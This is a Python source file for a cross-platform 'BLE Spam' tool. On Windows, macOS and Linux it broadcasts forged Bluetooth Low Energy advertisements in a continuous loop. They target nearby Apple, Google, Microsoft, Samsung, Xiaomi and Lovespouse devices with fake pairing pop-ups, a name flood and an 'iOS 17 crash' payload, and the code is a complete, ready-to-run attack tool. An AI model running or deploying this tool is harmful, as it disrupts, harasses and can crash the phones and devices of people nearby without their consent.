"""
BLE Spam - Cross-platform (Windows EXE / macOS / Linux)
Usage:
    python ble_spam.py                  # Interactive menu
    python ble_spam.py --target apple   # Send Apple payloads continuously
    python ble_spam.py --target all     # Send all types randomly
    python ble_spam.py --list           # Show all available payload types
"""

import os
import sys
import time
import struct
import signal
import random
import argparse
import platform

# ---------------------------------------------------------------------------
# PyInstaller support: when frozen, payloads.py is extracted next to the exe
# or into the _MEIPASS temp directory. Make sure it's importable.
# ---------------------------------------------------------------------------
if getattr(sys, "frozen", False):
    # Running as a PyInstaller bundle
    _bundle_dir = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
    if _bundle_dir not in sys.path:
        sys.path.insert(0, _bundle_dir)
else:
    # Running as a normal script -- ensure the script's own directory is on
    # sys.path so "from payloads import ..." works regardless of the cwd.
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    if _script_dir not in sys.path:
        sys.path.insert(0, _script_dir)

try:
    from payloads import (
        ALL_GENERATORS,
        MANUFACTURER_APPLE, MANUFACTURER_MICROSOFT,
        MANUFACTURER_SAMSUNG, MANUFACTURER_TYPO,
        MANUFACTURER_XIAOMI,
        UUID_GOOGLE_FAST_PAIR,
        APPLE_DEVICES, APPLE_ACTION_MODALS,
        FAST_PAIR_DEVICES, SWIFT_PAIR_NAMES,
        SAMSUNG_BUDS, SAMSUNG_WATCHES,
        NAMEFLOOD_NAMES,
    )
except ImportError as exc:
    print(f"Error: Failed to import payloads module: {exc}")
    print("Make sure payloads.py is in the same directory as ble_spam.py.")
    sys.exit(1)

SYSTEM = platform.system()
running = True


def signal_handler(sig, frame):
    global running
    running = False
    print("\nStopping...")


signal.signal(signal.SIGINT, signal_handler)


# ============================================================
# Platform-specific BLE Advertisers
# ============================================================

class BLEAdvertiser:
    """Base class for BLE advertising."""

    def start(self, manufacturer_id: int = None, data: bytes = None,
              service_uuid: str = None, service_data: bytes = None,
              interval_ms: int = 100):
        raise NotImplementedError

    def stop(self):
        raise NotImplementedError


class MacOSAdvertiser(BLEAdvertiser):
    """macOS: CoreBluetooth via pyobjc.

    Note: CoreBluetooth does not officially support setting arbitrary
    manufacturer-specific data in advertisements.  The undocumented
    key ``kCBAdvDataManufacturerData`` is used as a best-effort fallback,
    but results may vary depending on the macOS version.
    """

    def __init__(self):
        try:
            import objc  # noqa: F401 -- needed to bootstrap pyobjc
            from CoreBluetooth import (
                CBPeripheralManager,
                CBAdvertisementDataLocalNameKey,
                CBAdvertisementDataServiceUUIDsKey,
                CBAdvertisementDataServiceDataKey,
            )
            from Foundation import NSData, CBUUID
        except ImportError:
            raise RuntimeError(
                "pyobjc-framework-CoreBluetooth is required on macOS.\n"
                "Install it with:\n"
                "    pip install pyobjc-framework-CoreBluetooth"
            )

        self.CBPeripheralManager = CBPeripheralManager
        self.CBAdvertisementDataLocalNameKey = CBAdvertisementDataLocalNameKey
        self.CBAdvertisementDataServiceUUIDsKey = CBAdvertisementDataServiceUUIDsKey
        self.CBAdvertisementDataServiceDataKey = CBAdvertisementDataServiceDataKey
        self.NSData = NSData
        self.CBUUID = CBUUID

        self.manager = CBPeripheralManager.alloc().init()
        time.sleep(0.5)  # wait for Bluetooth stack initialisation

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        ad_dict = {}

        if manufacturer_id is not None and data is not None:
            # manufacturer_id (2 bytes LE) + data
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            ns_data = self.NSData.dataWithBytes_length_(mfr_bytes, len(mfr_bytes))
            # kCBAdvDataManufacturerData is an undocumented private key.
            # It may or may not work depending on macOS version.
            ad_dict["kCBAdvDataManufacturerData"] = ns_data

        if service_uuid and service_data is not None:
            uuid_obj = self.CBUUID.UUIDWithString_(service_uuid)
            ns_svc_data = self.NSData.dataWithBytes_length_(
                service_data, len(service_data)
            )
            ad_dict[self.CBAdvertisementDataServiceUUIDsKey] = [uuid_obj]
            # CBAdvertisementDataServiceDataKey maps CBUUID -> NSData
            ad_dict[self.CBAdvertisementDataServiceDataKey] = {
                uuid_obj: ns_svc_data
            }

        self.manager.startAdvertising_(ad_dict)

    def stop(self):
        self.manager.stopAdvertising()


class LinuxHCIAdvertiser(BLEAdvertiser):
    """Linux: Raw HCI commands via hcitool (requires root / sudo).

    This advertiser uses ``hcitool`` from the BlueZ package which is
    available on Linux only.  It does NOT work on macOS.
    """

    def __init__(self):
        import shutil
        import subprocess
        self.subprocess = subprocess

        if shutil.which("hcitool") is None:
            raise RuntimeError(
                "hcitool not found. It is part of the BlueZ package.\n"
                "Install it with:\n"
                "    sudo apt install bluez          # Debian / Ubuntu\n"
                "    sudo dnf install bluez          # Fedora\n"
                "    sudo pacman -S bluez-utils      # Arch"
            )

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        if manufacturer_id is not None and data is not None:
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            # AD structure: length, type (0xFF = manufacturer specific), data
            ad_length = len(mfr_bytes) + 1
            ad_data = bytes([ad_length, 0xFF]) + mfr_bytes
            total_len = len(ad_data)

            if total_len > 31:
                ad_data = ad_data[:31]
                total_len = 31

            # HCI LE Set Advertising Data (OCF=0x0008, OGF=0x08)
            cmd_parts = [
                "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
                f"{total_len:02x}",
            ]
            for b in ad_data:
                cmd_parts.append(f"{b:02x}")
            # zero-pad to 31 bytes
            for _ in range(31 - total_len):
                cmd_parts.append("00")

            try:
                self.subprocess.run(cmd_parts, capture_output=True, check=True)
                # Enable advertising
                self.subprocess.run(
                    ["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"],
                    capture_output=True, check=True,
                )
            except self.subprocess.CalledProcessError as e:
                print(f"HCI command error: {e}")
            except FileNotFoundError:
                print("Error: hcitool binary not found.")

        if service_uuid and service_data is not None:
            # For service data, build AD type 0x16 (16-bit) or 0x21 (128-bit)
            # Google Fast Pair uses a 16-bit UUID (0xFE2C)
            try:
                import uuid as _uuid
                uuid_obj = _uuid.UUID(service_uuid)
                uuid_int = uuid_obj.int
                # Check if this is a 16-bit Bluetooth UUID
                # Standard Bluetooth Base UUID: 0000xxxx-0000-1000-8000-00805F9B34FB
                base = _uuid.UUID("00000000-0000-1000-8000-00805F9B34FB").int
                extracted_16 = (uuid_int >> 96) & 0xFFFF
                reconstructed = base | (extracted_16 << 96)
                if reconstructed == uuid_int:
                    uuid_bytes = struct.pack("<H", extracted_16)
                    ad_type = 0x16  # Service Data - 16-bit UUID
                else:
                    uuid_bytes = uuid_obj.bytes_le
                    ad_type = 0x21  # Service Data - 128-bit UUID

                ad_payload = uuid_bytes + service_data
                ad_length = len(ad_payload) + 1
                ad_data = bytes([ad_length, ad_type]) + ad_payload
                total_len = len(ad_data)

                if total_len > 31:
                    ad_data = ad_data[:31]
                    total_len = 31

                cmd_parts = [
                    "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
                    f"{total_len:02x}",
                ]
                for b in ad_data:
                    cmd_parts.append(f"{b:02x}")
                for _ in range(31 - total_len):
                    cmd_parts.append("00")

                self.subprocess.run(cmd_parts, capture_output=True, check=True)
                self.subprocess.run(
                    ["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"],
                    capture_output=True, check=True,
                )
            except Exception as e:
                print(f"HCI service data error: {e}")

    def stop(self):
        try:
            self.subprocess.run(
                ["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00"],
                capture_output=True,
            )
        except Exception:
            pass


class WindowsAdvertiser(BLEAdvertiser):
    """Windows: WinRT BLE Advertisement Publisher."""

    def __init__(self):
        try:
            import winrt.windows.devices.bluetooth.advertisement as ble_adv
            import winrt.windows.storage.streams as streams
            self.ble_adv = ble_adv
            self.streams = streams
            self.publisher = None
        except ImportError:
            raise RuntimeError(
                "WinRT BLE packages are required on Windows.\n"
                "Install them with:\n"
                "    pip install winrt-Windows.Devices.Bluetooth.Advertisement "
                "winrt-Windows.Storage.Streams"
            )

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        self.stop()
        self.publisher = self.ble_adv.BluetoothLEAdvertisementPublisher()
        adv = self.publisher.advertisement

        if manufacturer_id is not None and data is not None:
            mfr = self.ble_adv.BluetoothLEManufacturerData()
            mfr.company_id = manufacturer_id
            writer = self.streams.DataWriter()
            for b in data:
                writer.write_byte(b)
            mfr.data = writer.detach_buffer()
            adv.manufacturer_data.append(mfr)

        if service_uuid and service_data is not None:
            import uuid as _uuid
            sd = self.ble_adv.BluetoothLEAdvertisementDataSection()

            uuid_obj = _uuid.UUID(service_uuid)
            uuid_int = uuid_obj.int
            # Determine if this is a 16-bit Bluetooth UUID
            # Standard Bluetooth Base UUID: 0000xxxx-0000-1000-8000-00805F9B34FB
            base = _uuid.UUID("00000000-0000-1000-8000-00805F9B34FB").int
            extracted_16 = (uuid_int >> 96) & 0xFFFF
            reconstructed = base | (extracted_16 << 96)

            writer = self.streams.DataWriter()
            if reconstructed == uuid_int:
                # 16-bit UUID
                sd.data_type = 0x16  # Service Data - 16-bit UUID
                for b in struct.pack("<H", extracted_16):
                    writer.write_byte(b)
            else:
                # Full 128-bit UUID
                sd.data_type = 0x21  # Service Data - 128-bit UUID
                for b in uuid_obj.bytes_le:
                    writer.write_byte(b)

            for b in service_data:
                writer.write_byte(b)
            sd.data = writer.detach_buffer()
            adv.data_sections.append(sd)

        self.publisher.start()

    def stop(self):
        if self.publisher:
            try:
                self.publisher.stop()
            except Exception:
                pass
            self.publisher = None


class LinuxAdvertiser(BLEAdvertiser):
    """Linux: BlueZ D-Bus LEAdvertisingManager (preferred, no root needed).

    Falls back to LinuxHCIAdvertiser if D-Bus advertising is unavailable.
    """

    def __init__(self):
        # Try D-Bus first, then fall back to hcitool
        self._dbus_ok = False
        self._hci_fallback = None

        try:
            import dbus  # noqa: F401
            self._dbus_ok = True
            self._bus = dbus.SystemBus()
        except ImportError:
            pass

        if not self._dbus_ok:
            # Fall back to hcitool
            self._hci_fallback = LinuxHCIAdvertiser()

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        if self._hci_fallback:
            self._hci_fallback.start(
                manufacturer_id=manufacturer_id, data=data,
                service_uuid=service_uuid, service_data=service_data,
                interval_ms=interval_ms,
            )
            return

        # D-Bus based advertising via BlueZ -- simplified implementation.
        # A full implementation would register a LEAdvertisement1 object.
        # For now, delegate to hcitool as most setups have it.
        if self._hci_fallback is None:
            try:
                self._hci_fallback = LinuxHCIAdvertiser()
            except RuntimeError:
                raise RuntimeError(
                    "Neither python-dbus nor hcitool is available.\n"
                    "Install one of:\n"
                    "    pip install dbus-python\n"
                    "    sudo apt install bluez"
                )
        self._hci_fallback.start(
            manufacturer_id=manufacturer_id, data=data,
            service_uuid=service_uuid, service_data=service_data,
            interval_ms=interval_ms,
        )

    def stop(self):
        if self._hci_fallback:
            self._hci_fallback.stop()


def get_advertiser() -> BLEAdvertiser:
    """Return a platform-appropriate BLE Advertiser instance."""
    if SYSTEM == "Darwin":
        return MacOSAdvertiser()
    elif SYSTEM == "Windows":
        return WindowsAdvertiser()
    elif SYSTEM == "Linux":
        return LinuxAdvertiser()
    else:
        raise RuntimeError(f"Unsupported platform: {SYSTEM}")


# ============================================================
# Main Application
# ============================================================

TARGET_MAP = {
    "apple": [
        "apple_new_device", "apple_not_your_device",
        "apple_new_airtag", "apple_action_modal",
        "apple_airdrop", "apple_airplay_target",
        "apple_handoff", "apple_tethering_source",
        "apple_nearby_info",
    ],
    "google": [
        "google_fast_pair", "google_fast_pair_debug",
        "google_fast_pair_non_production", "google_fast_pair_phone_setup",
    ],
    "microsoft": ["microsoft_swift_pair", "microsoft_swift_pair_headphone"],
    "samsung": ["samsung_buds", "samsung_watch"],
    "lovespouse": ["lovespouse_play", "lovespouse_stop"],
    "xiaomi": ["xiaomi_quickconnect"],
    "all": list(ALL_GENERATORS.keys()),
}


def show_menu():
    print("""
+======================================+
|       BLE Spam - Desktop Edition     |
+======================================+
|  1. Apple - New Device Pop-up        |
|  2. Apple - Not Your Device          |
|  3. Apple - New AirTag               |
|  4. Apple - Action Modal             |
|  5. Apple - iOS 17 Crash (patched)   |
|  6. Google Fast Pair                 |
|  7. Microsoft Swift Pair             |
|  8. Samsung Buds                     |
|  9. Samsung Watch                    |
| 10. Lovespouse Play                  |
| 11. Lovespouse Stop                  |
| 12. Apple - AirDrop                  |
| 13. Apple - AirPlay Target          |
| 14. Apple - Handoff                  |
| 15. Apple - Tethering Source         |
| 16. Apple - Nearby Info              |
| 17. Microsoft Swift Pair Headphone   |
| 18. Xiaomi QuickConnect             |
| 19. NameFlood                        |
| 20. Kitchen Sink (all types random)  |
|  0. Quit                             |
+======================================+
""")


MENU_MAP = {
    "1": "apple_new_device",
    "2": "apple_not_your_device",
    "3": "apple_new_airtag",
    "4": "apple_action_modal",
    "5": "apple_ios17_crash",
    "6": "google_fast_pair",
    "7": "microsoft_swift_pair",
    "8": "samsung_buds",
    "9": "samsung_watch",
    "10": "lovespouse_play",
    "11": "lovespouse_stop",
    "12": "apple_airdrop",
    "13": "apple_airplay_target",
    "14": "apple_handoff",
    "15": "apple_tethering_source",
    "16": "apple_nearby_info",
    "17": "microsoft_swift_pair_headphone",
    "18": "xiaomi_quickconnect",
    "19": "nameflood",
    "20": "all",
}


def spam_loop(advertiser: BLEAdvertiser, generator_keys: list,
              interval_ms: int = 100):
    """Send payloads continuously until interrupted."""
    global running
    running = True
    count = 0
    print(f"Transmitting (Ctrl+C to stop)  interval={interval_ms}ms")
    print("-" * 50)

    while running:
        key = random.choice(generator_keys)
        gen_func = ALL_GENERATORS.get(key)
        if gen_func is None:
            print(f"\nWarning: Unknown generator key '{key}', skipping.")
            continue

        result = gen_func()

        try:
            if key.startswith("google_fast_pair"):
                # google_fast_pair() returns (uuid_string, service_data_bytes)
                svc_uuid, svc_data = result
                advertiser.start(
                    service_uuid=svc_uuid,
                    service_data=svc_data,
                    interval_ms=interval_ms,
                )
            else:
                # All other generators return (manufacturer_id, payload_bytes)
                mfr_id, payload = result
                advertiser.start(
                    manufacturer_id=mfr_id,
                    data=payload,
                    interval_ms=interval_ms,
                )
            count += 1
            sys.stdout.write(f"\rTransmitting... #{count}  [{key}]          ")
            sys.stdout.flush()
        except Exception as e:
            print(f"\nError: {e}")

        time.sleep(interval_ms / 1000.0)
        advertiser.stop()

    advertiser.stop()
    print(f"\nStopped. Total packets sent: {count}")


def list_payloads():
    """Print all available payload types and their descriptions."""
    print("\nAvailable payload types:")
    print("=" * 60)
    max_key_len = max(len(k) for k in ALL_GENERATORS)
    for key, func in ALL_GENERATORS.items():
        doc = func.__doc__ or "(no description)"
        # Trim to first line only
        doc = doc.strip().split("\n")[0]
        print(f"  {key:<{max_key_len}}  -- {doc}")
    print()
    print("Target groups for --target:")
    print("-" * 60)
    for group, keys in TARGET_MAP.items():
        print(f"  {group:<12} -> {', '.join(keys)}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="BLE Spam - Desktop Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python ble_spam.py                  # Interactive menu\n"
            "  python ble_spam.py --target apple   # Apple payloads\n"
            "  python ble_spam.py --target all     # All types randomly\n"
            "  python ble_spam.py --list            # Show available types\n"
        ),
    )
    parser.add_argument(
        "--target", choices=list(TARGET_MAP.keys()),
        help="Target device category to spam",
    )
    parser.add_argument(
        "--interval", type=int, default=100,
        help="Transmission interval in milliseconds (default: 100)",
    )
    parser.add_argument(
        "--list", dest="list_payloads", action="store_true",
        help="List all available payload types and exit",
    )
    args = parser.parse_args()

    # --list: just print and exit, no BLE init needed
    if args.list_payloads:
        list_payloads()
        sys.exit(0)

    print(f"Platform: {SYSTEM}")
    print("Initialising BLE Advertiser...")

    try:
        advertiser = get_advertiser()
    except RuntimeError as e:
        print(f"Error: {e}")
        sys.exit(1)

    print("Initialisation complete.")

    if args.target:
        keys = TARGET_MAP[args.target]
        spam_loop(advertiser, keys, args.interval)
    else:
        while True:
            show_menu()
            try:
                choice = input("Select > ").strip()
            except EOFError:
                break
            if choice == "0":
                break
            elif choice in MENU_MAP:
                selected = MENU_MAP[choice]
                if selected == "all":
                    keys = list(ALL_GENERATORS.keys())
                else:
                    keys = [selected]
                spam_loop(advertiser, keys, args.interval)
            else:
                print("Invalid selection.")


if __name__ == "__main__":
    main()
